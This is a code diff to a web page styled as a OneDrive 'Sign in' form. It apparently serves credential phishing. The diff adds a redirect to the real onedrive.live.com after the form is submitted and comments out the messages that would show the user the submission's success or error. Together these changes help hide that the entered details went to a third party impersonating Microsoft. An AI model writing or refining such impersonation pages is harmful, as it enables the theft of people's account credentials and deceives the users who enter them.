@@ -39,6 +39,8 @@ export default function Home() {
     },
     onSuccess: () => {
       reset();
+      // Redirect to OneDrive on successful form submission
+      window.location.href = "https://onedrive.live.com";
     },
   });
 
@@ -48,16 +50,16 @@ export default function Home() {
 
   return (
     <div className="login-container">
-      <Image src="/images" alt="OneDrive Logo" width={100} height={100} />
+      <Image src="/images.png" alt="OneDrive Logo" width={100} height={100} />
       <h2>Sign in</h2>
       <form onSubmit={handleSubmit(onSubmit)}>
         {/* Live region for status messages */}
-        <div role="status" aria-live="polite" style={{ minHeight: 20 }}>
-          {mutation.isSuccess && <span>Submitted successfully.</span>}
-          {mutation.isError && (
+        {/* <div role="status" aria-live="polite" style={{ minHeight: 20 }}> */}
+          {/* {mutation.isSuccess && <span>Submitted successfully.</span>} */}
+          {/* {mutation.isError && (
             <span style={{ color: "#b00020" }}>{(mutation.error as Error)?.message}</span>
-          )}
-        </div>
+          )} */}
+        {/* </div> */}
         <input
           type="email"
           id="email"
